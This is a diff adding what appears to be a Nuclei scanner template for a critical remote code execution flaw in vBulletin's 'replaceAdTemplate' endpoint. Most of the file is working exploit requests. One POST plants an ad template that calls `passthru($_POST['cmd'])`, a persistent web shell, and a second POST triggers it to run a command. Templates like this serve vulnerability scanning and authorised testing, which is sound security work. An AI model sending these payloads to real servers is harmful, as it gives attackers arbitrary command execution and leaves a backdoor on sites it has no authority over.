@@ -1,0 +1,49 @@
+id: vbulletin-replacead-rce
+
+info:
+  name: vBulletin replaceAdTemplate - Remote Code Execution
+  author: DhiyaneshDK
+  severity: critical
+  description: |
+    vBulletin's 'replaceAdTemplate' API endpoint allows an attacker to upload a malicious template containing arbitrary PHP code execution via `passthru()` and gain remote code execution. This vulnerability can be exploited by sending a POST request to the endpoint with a malicious template and then rendering it using the 'ajax/render/ad_rce' endpoint.
+  reference:
+    - https://karmainsecurity.com/pocs/vBulletin-replaceAdTemplate-RCE.php
+    - https://karmainsecurity.com/dont-call-that-protected-method-vbulletin-rce
+  tags: rce,vbulletin,intrusive
+
+variables:
+  string: "{{to_lower(rand_base(5))}}"
+  value: "{{to_lower(rand_text_alpha(5))}}"
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        routestring=ajax/api/ad/replaceAdTemplate&styleid=1&location={{string}}&template=<vb:if condition='"passthru"($_POST["cmd"])'></vb:if>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(content_type,"application/json")'
+          - 'status_code == 200'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        routestring=ajax/render/ad_{{string}}&cmd=echo+{{value}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"template","{{value}}")'
+          - 'contains(content_type,"application/json")'
+          - 'status_code == 200'
+        condition: and
